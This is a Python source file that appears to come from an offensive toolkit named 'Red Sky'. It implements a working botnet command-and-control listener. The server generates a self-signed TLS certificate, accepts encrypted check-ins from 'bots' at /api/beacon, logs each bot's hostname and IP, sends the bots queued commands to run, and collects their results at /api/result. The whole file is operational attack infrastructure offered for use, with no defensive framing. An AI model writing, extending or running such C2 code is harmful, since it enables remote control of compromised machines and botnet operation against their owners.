# language: Python, file: Program/c2/listener.py, target: Red Sky c2 — HTTPS listener
# Bot-facing C2. HTTPS (self-signed by default) or HTTP.

import argparse
import json
import os
import ssl
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Dict, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import DATA_DIR, OUTPUT_DIR
from .protocol import (
    Message, encode_packet, decode_packet, ProtocolError,
    MT_CHECKIN, MT_TASK, MT_RESULT,
)
from .session import SessionStore


CERT_PATH = DATA_DIR / "c2_cert.pem"
KEY_PATH  = DATA_DIR / "c2_key.pem"


def _gen_self_signed_cert():
    if CERT_PATH.exists() and KEY_PATH.exists():
        return
    print_info("generating self-signed TLS cert (first run)")
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime as dt
        import ipaddress

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "red-sky-c2"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Red Sky"),
        ])
        now = dt.datetime.utcnow()
        cert = (x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + dt.timedelta(days=3650))
                .add_extension(x509.SubjectAlternativeName([
                    x509.DNSName("localhost"),
                    x509.DNSName("127.0.0.1"),
                    x509.IPAddress(ipaddress.ip_address("127.0.0.1")),
                    x509.IPAddress(ipaddress.ip_address("0.0.0.0")),
                ]), critical=False)
                .sign(key, hashes.SHA256()))

        CERT_PATH.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
        KEY_PATH.write_bytes(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ))
        print_ok(f"cert written to {CERT_PATH}")
    except Exception as e:
        print_err(f"cert generation failed: {e}")
        raise


class C2Handler(BaseHTTPRequestHandler):
    store: SessionStore = None

    def log_message(self, fmt, *args):
        pass

    def _client_ip(self) -> str:
        xff = self.headers.get("X-Forwarded-For", "")
        if xff:
            return xff.split(",")[0].strip()
        return self.client_address[0]

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length", "0") or 0)
        if length <= 0:
            return b""
        return self.rfile.read(min(length, 1 * 1024 * 1024))

    def _respond(self, code: int, body: bytes = b"", ct: str = "application/octet-stream"):
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_POST(self):
        path = self.path.rstrip("/")
        if path == "/api/beacon":
            return self._handle_beacon()
        if path == "/api/result":
            return self._handle_result()
        self._respond(404, b"not found", "text/plain")

    def do_GET(self):
        if self.path.rstrip("/") == "/health":
            return self._respond(200, b"ok", "text/plain")
        self._respond(404, b"not found", "text/plain")

    def _handle_beacon(self):
        try:
            body = self._read_body().decode("ascii", errors="replace").strip()
            parts = body.split("\n")
            if len(parts) < 3:
                return self._respond(400, b"bad request", "text/plain")
            bot_id, key_hex, pkt_hex = parts[0], parts[1], parts[2]
            key = bytes.fromhex(key_hex)
            pkt = bytes.fromhex(pkt_hex)
        except (ValueError, IndexError):
            return self._respond(400, b"bad framing", "text/plain")

        try:
            msg = decode_packet(pkt, key)
        except ProtocolError as e:
            print_warn(f"beacon decode failed: {e}")
            return self._respond(400, b"bad packet", "text/plain")

        ip = self._client_ip()

        if msg.type == MT_CHECKIN:
            info = msg.payload or {}
            info["ip"] = ip
            self.store.register_bot(bot_id, key_hex, info)
            self.store.log_event(bot_id, "checkin", {"ip": ip})
            print(f"  {OK}▓{RESET} checkin {BONE}{bot_id}{RESET} "
                  f"{ASH}{info.get('hostname','?')}@{ip}{RESET}")
        else:
            # any non-checkin message (ping, result, etc.) counts as activity
            self.store.touch_bot(bot_id, ip)
            if msg.type == 0x04:  # MT_PING
                print(f"  {ARTERY}▓{RESET} poll    {BONE}{bot_id}{RESET}")

        tasks = self.store.pull_tasks(bot_id, limit=10)
        reply_payload = {"tasks": [
            {"id": t["id"], "command": t["command"],
             "args": json.loads(t["args"] or "{}")}
            for t in tasks
        ]}
        reply = Message(type=MT_TASK, payload=reply_payload)
        reply_pkt = encode_packet(reply, key)
        self._respond(200, reply_pkt.hex().encode("ascii"), "text/plain")

    def _handle_result(self):
        try:
            self._handle_result_inner()
        except Exception as e:
            import traceback
            print_err(f"result handler crashed: {e}")
            traceback.print_exc()

    def _handle_result_inner(self):
        try:
            body = self._read_body().decode("ascii", errors="replace").strip()
            parts = body.split("\n")
            if len(parts) < 3:
                return self._respond(400, b"bad request", "text/plain")
            bot_id, key_hex, pkt_hex = parts[0], parts[1], parts[2]
            key = bytes.fromhex(key_hex)
            pkt = bytes.fromhex(pkt_hex)
        except (ValueError, IndexError):
            return self._respond(400, b"bad framing", "text/plain")

        try:
            msg = decode_packet(pkt, key)
        except ProtocolError as e:
            print_warn(f"result decode failed: {e}")
            return self._respond(400, b"bad packet", "text/plain")

        task_id = msg.payload.get("task_id", "")
        output = msg.payload.get("output", "")
        ok = msg.payload.get("ok", True)
        if task_id:
            self.store.complete_task(task_id, output, ok)
            self.store.log_event(bot_id, "task_result", {"task_id": task_id, "ok": ok})
            print(f"  {ARTERY}▓{RESET} result {BONE}{bot_id[:12]}{RESET} "
                  f"task={task_id[:8]} ok={ok}")

        self._respond(200, b"ok", "text/plain")


def serve(host: str, port: int, use_tls: bool) -> int:
    store = SessionStore()
    C2Handler.store = store

    scheme = "https" if use_tls else "http"
    print_info(f"c2 listener on {scheme}://{host}:{port}")
    print_kv("beacon path", "/api/beacon")
    print_kv("result path", "/api/result")
    print_kv("health path", "/health")
    print_kv("db", store.path)
    print()

    httpd = ThreadingHTTPServer((host, port), C2Handler)
    httpd.daemon_threads = True
    httpd.allow_reuse_address = True

    if use_tls:
        _gen_self_signed_cert()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(str(CERT_PATH), str(KEY_PATH))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        print_ok("TLS enabled (self-signed)")

    print()
    print(f"{ASH}  bots should dial: {scheme}://{host}:{port}/api/beacon{RESET}")
    print(f"{ASH}  CTRL+C to stop{RESET}")
    print()

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print()
        print_info("stopped")
    finally:
        httpd.server_close()
        store.close()
    return 0


def show_stats() -> int:
    s = SessionStore()
    stats = s.stats()
    print()
    for k, v in stats.items():
        print_kv(k, v)
    print()
    bots = s.list_bots()
    if bots:
        print_info("bots:")
        for b in bots[:20]:
            age = int(time.time()) - b["last_seen"]
            mark = f"{OK}▓{RESET}" if age < 300 else f"{CLOT}░{RESET}"
            print(f"  {mark} {BONE}{b['id'][:12]:<12}{RESET} "
                  f"{ASH}{b['hostname']:<20}{RESET} {CLOT}{age}s ago{RESET}")
    s.close()
    return 0


def run_cli(args) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky c2", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--tls", action="store_true")
    p.add_argument("action", nargs="?", default="serve")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky c2 <serve|stats|bots> [--host H] [--port N] [--tls]")
        return 2

    if ns.help:
        print_info("redsky c2 serve [--host H] [--port N] [--tls]")
        print_info("redsky c2 stats")
        print_info("redsky c2 bots")
        return 0

    if ns.action in ("stats", "bots"):
        return show_stats()
    return serve(ns.host, ns.port, ns.tls)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
